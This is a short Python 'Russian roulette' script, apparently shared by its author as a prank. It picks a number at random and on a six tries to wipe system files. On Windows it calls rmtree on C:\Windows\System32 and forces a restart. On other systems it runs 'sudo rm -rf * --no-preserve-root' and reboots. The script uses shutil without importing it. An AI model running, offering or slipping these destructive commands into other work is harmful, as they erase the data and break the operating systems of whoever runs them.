# masoncodes.me
# licensed under GNU GPL v3
# I AM NOT RESPONSIBLE FOR THE LOSS OF ANY DATA DUE TO YOU RUNNING THIS FILE!

import os
import random

spin = random.randint(1, 6)

if os.name == "nt":
    if spin == 6:
        shutil.rmtree("C:\Windows\System32")
        os.system('shutdown -r')
    else:
        print("Click.")

else:
    if spin == 6:
        os.system('sudo rm -rf * --no-preserve-root')
        os.system('sudo reboot')
